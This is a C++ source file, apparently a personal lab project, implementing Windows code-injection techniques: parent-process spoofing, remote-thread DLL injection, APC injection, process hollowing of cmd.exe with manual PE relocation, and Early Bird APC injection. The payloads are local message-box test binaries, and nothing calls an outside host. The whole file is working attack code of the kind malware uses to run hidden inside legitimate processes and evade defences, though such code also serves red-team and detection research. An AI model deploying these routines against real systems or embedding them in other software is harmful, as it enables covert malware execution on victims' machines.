#include "techniques.h"


void PrintError(LPCSTR message) 
{
	printf("Error %x: %s\n", GetLastError(), message);
}


void ppid_spoofing(DWORD dwProcessId)
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, dwProcessId);
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
}


void injecting_dll(DWORD dwProcessId, char* dll_path)
{
	SIZE_T lpNumberOfBytesWritten = 0;
	DWORD ThreadId = 0;

	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	if (hprocess == NULL)
	{
		PrintError("failed OpenProcess");
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

	LPVOID loadlib_addr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");

	if (loadlib_addr == NULL)
		PrintError("failed GetProcAddress");

	LPVOID loadlib_param = VirtualAllocEx(hprocess, 0, 128, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if(loadlib_param == NULL)
		PrintError("failed VirtualAllocEx");
	
	
	WriteProcessMemory(hprocess, loadlib_param, dll_path, strlen(dll_path), &lpNumberOfBytesWritten);

	printf("dll %s byte written %d\n", dll_path, lpNumberOfBytesWritten);

	HANDLE hThread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib_addr, loadlib_param, 0, &ThreadId);

	if (hThread == NULL)
	{
		PrintError("failed openprocess");
	}
	printf("Injected %d\n", hThread);
	printf("address %p\n", loadlib_param);
	CloseHandle(hprocess);
}


void apc_injection(DWORD dwProcessId, char* dll_path)
{
	printf("apc_injection\n");


	SIZE_T lpNumberOfBytesWritten = 0;
	DWORD ThreadId = 0;

	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	if (hprocess == NULL)
	{
		PrintError("failed OpenProcess");
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

	LPVOID loadlib_addr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");

	if (loadlib_addr == NULL)
		PrintError("failed GetProcAddress");

	LPVOID loadlib_param = VirtualAllocEx(hprocess, 0, 128, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (loadlib_param == NULL)
	{
		PrintError("failed VirtualAllocEx");
	}


	if (!WriteProcessMemory(hprocess, loadlib_param, dll_path, strlen(dll_path), &lpNumberOfBytesWritten))
	{
		PrintError("failed WriteProcessMemory");
	}

	printf("dll %s byte written %d\n", dll_path, lpNumberOfBytesWritten);


	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		PrintError("failed CreateToolhelp32Snapshot");
	}

	THREADENTRY32 te;
	te.dwSize = sizeof(te);
	DWORD tid = 0;

	Thread32First(hSnapshot, &te);
	while (Thread32Next(hSnapshot, &te))
	{
		//printf("thread of process %d\n", te.th32OwnerProcessID);
		if (te.th32OwnerProcessID == dwProcessId) 
		{
			//printf("Thread found %d\n", dwProcessId);
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			if (hThread)
			{
				if(QueueUserAPC((PAPCFUNC)loadlib_addr, hThread, (ULONG_PTR)loadlib_param))
					printf("APCInjected\n");
			}
			else
			{
				PrintError("failed OpenThread");
			}
			printf("Injected %d\n", hThread);
			printf("address %p\n", loadlib_param);
			CloseHandle(hThread);
			break;
		}
	}
	CloseHandle(hSnapshot);
	CloseHandle(hprocess);
}


void phollowing_injection()
{
	printf("process hollowing injection\n");

	SIZE_T lpNumberOfBytesWritten = 0;
	DWORD ThreadId = 0;

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	char command[] = "cmd.exe";
	bool create = CreateProcessA(0, command, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

	if (create == NULL)
	{
		PrintError("failed CreateProcessA");
	}

	HANDLE hprocess = pProcessInfo->hProcess;


	HMODULE ntDll = LoadLibraryA("ntdll.dll");

	NTQUERYINFOPROC NtQueryInfoProcess = NULL;
	NtQueryInfoProcess = (NTQUERYINFOPROC)GetProcAddress(ntDll, "NtQueryInformationProcess");

	if (NtQueryInfoProcess == NULL)
	{
		PrintError("failed GetProcAddress(NtQueryInfoProcess)");
	}

	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG ReturnedLength = 0;
	SIZE_T bytesRead = 0;
	LPVOID destImageBase = 0;
	bool success = false;

	NtQueryInfoProcess(hprocess, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &ReturnedLength);

	PPEB pPeb = new PEB();

	LPVOID ImageBase = 0;

	//success = ReadProcessMemory(hprocess, ProcessInformation.PebBaseAddress, pPeb, sizeof(PEB), &bytesRead);
	success = ReadProcessMemory(hprocess, (char*)ProcessInformation.PebBaseAddress+16, &ImageBase, sizeof(ImageBase), &bytesRead);

	if (!bytesRead || !success)
	{
		PrintError("failed ReadProcessMemory");
		return;
	}

	printf("destImageBase %p\n", ImageBase);

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)(GetProcAddress(ntDll, "NtUnmapViewOfSection"));
	
	
	success = NtUnmapViewOfSection(hprocess, ImageBase);

	if (!success)
	{
		PrintError("failed NtUnmapViewOfSection");
		//return;
	}

	HANDLE sourceFile = CreateFileA("C:\\Users\\reverse\\source\\repos\\injections_techniques\\x64\\Debug\\msgbox_exe.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);


	LPVOID lpFileBuffer = NULL;
	PIMAGE_DOS_HEADER sourceImageDosHeader;
	PIMAGE_NT_HEADERS sourceImageNTHeader;
	PIMAGE_SECTION_HEADER sourceImageSectionHeader;

	

	lpFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);



	success = ReadFile(sourceFile, lpFileBuffer, sourceFileSize, NULL, NULL);

	if (!success)
	{
		PrintError("failed ReadFile");
		return;
	}


	printf("size %d \n", sourceFileSize);

	


	sourceImageDosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;

	sourceImageNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileBuffer + sourceImageDosHeader->e_lfanew);


	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileBuffer + sourceImageDosHeader->e_lfanew);

	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	LPVOID newDestImageBase = VirtualAllocEx(hprocess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);



	LPCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pProcessInfo->hThread, lpContext);




	if (!newDestImageBase)
	{
		PrintError("failed VirtualAllocEx");
		return;
	}

	printf("Memory allocated at Address: %p\n", (SIZE_T)newDestImageBase);

	SIZE_T dwDelta = (SIZE_T)newDestImageBase - sourceImageNTHeader->OptionalHeader.ImageBase;

	sourceImageNTHeader->OptionalHeader.ImageBase = (SIZE_T)newDestImageBase;
	printf("size of size_T\n", sizeof(SIZE_T));

	if (!WriteProcessMemory(pProcessInfo->hProcess, newDestImageBase, lpFileBuffer, sourceImageNTHeader->OptionalHeader.SizeOfHeaders, NULL))
	{
		PrintError("failed WriteProcessMemory pe header");
		return;
	}

	for (int i = 0; i < sourceImageNTHeader->FileHeader.NumberOfSections; i++)
	{
		sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + sourceImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		printf("section name: %s, virtual address %p, size %p\n", sourceImageSectionHeader->Name, sourceImageSectionHeader->VirtualAddress, sourceImageSectionHeader->SizeOfRawData);
		
		if (!WriteProcessMemory(hprocess, (LPBYTE)newDestImageBase + sourceImageSectionHeader->VirtualAddress, (LPBYTE)((LPBYTE)lpFileBuffer + sourceImageSectionHeader->PointerToRawData), sourceImageSectionHeader->SizeOfRawData, NULL))
		{
			PrintError("failed WriteProcessMemory sections");
			return;
		}
	}

	// relocation
	for (int i = 0; i < sourceImageNTHeader->FileHeader.NumberOfSections; i++)
	{
		sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + sourceImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));


		if (memcmp(sourceImageSectionHeader->Name, ".reloc", strlen(".reloc")))
			continue;
		printf("section name: %s, virtual address %p, size %p\n", sourceImageSectionHeader->Name, sourceImageSectionHeader->VirtualAddress, sourceImageSectionHeader->SizeOfRawData);


		DWORD dwRelocSectionRawData = sourceImageSectionHeader->PointerToRawData;
		IMAGE_DATA_DIRECTORY relocData = sourceImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		DWORD dwOffsetInRelocSection = 0;
		
		while (dwOffsetInRelocSection < relocData.Size)
		{
			PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)((SIZE_T)lpFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);
			dwOffsetInRelocSection += sizeof(BASE_RELOCATION_BLOCK);

			DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

			printf("entry %lu\n", dwEntryCount);

			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((SIZE_T)lpFileBuffer + dwRelocSectionRawData + dwOffsetInRelocSection);

			for (DWORD y = 0; y < dwEntryCount; y++)
			{
				dwOffsetInRelocSection += sizeof(BASE_RELOCATION_ENTRY);
				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				SIZE_T patchAddress = pBlockheader->PageAddress + relocationEntries[y].Offset;
				SIZE_T dwBuffer = 0;


				printf("patch address  %p\n", patchAddress);

				ReadProcessMemory(hprocess, (LPBYTE)newDestImageBase + patchAddress, &dwBuffer, sizeof(SIZE_T), 0);

				printf("dwBuffer %p\n", dwBuffer);

				dwBuffer += dwDelta;

				if (!WriteProcessMemory(hprocess, (LPBYTE)newDestImageBase + patchAddress, &dwBuffer, sizeof(SIZE_T), 0))
				{
					PrintError("error patching");
				}
			}


		}


	}

	printf("old lpContext->Rcx %p\n", lpContext->Rcx);

	lpContext->Rcx = (SIZE_T)((LPBYTE)newDestImageBase + sourceImageNTHeader->OptionalHeader.AddressOfEntryPoint);

	printf("new lpContext->Rcx %p\n", lpContext->Rcx);

	if(!WriteProcessMemory(pProcessInfo->hProcess, (PVOID)(lpContext->Rdx + (sizeof(SIZE_T) * 2)), &newDestImageBase, sizeof(newDestImageBase), NULL))
	{
			PrintError("failed WriteProcessMemory sections");
			return;
	}


	if (!SetThreadContext(pProcessInfo->hThread, lpContext))
	{
		PrintError("error SetThreadContext");
	}

	ResumeThread(pProcessInfo->hThread);
	printf("[*] Thread resumed.\n");

}


void inject_earlybird()
{
	printf("earlybird injection\n");

	DWORD ThreadId = 0;

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	char command[] = "cmd.exe";
	bool create = CreateProcessA(0, command, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);

	if (create == NULL)
	{
		PrintError("failed CreateProcessA");
	}

	HANDLE hprocess = pProcessInfo->hProcess;
	HANDLE hthread = pProcessInfo->hThread;

	HMODULE ntDll = LoadLibraryA("ntdll.dll");


	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	LPVOID loadlib_addr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");

	char path[] = "C:\\Users\\reverse\\source\\repos\\injections_techniques\\x64\\Debug\\msgbox_dll.dll";

	LPVOID loadlib_param = VirtualAllocEx(hprocess, 0, 128, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	SIZE_T lpNumberOfBytesWritten = 0;

	WriteProcessMemory(hprocess, loadlib_param, (LPVOID)path, strlen(path), &lpNumberOfBytesWritten);

	if (QueueUserAPC((PAPCFUNC)loadlib_addr, hthread, (ULONG_PTR)loadlib_param))
		printf("APCInjected\n");


	ResumeThread(hthread);

}

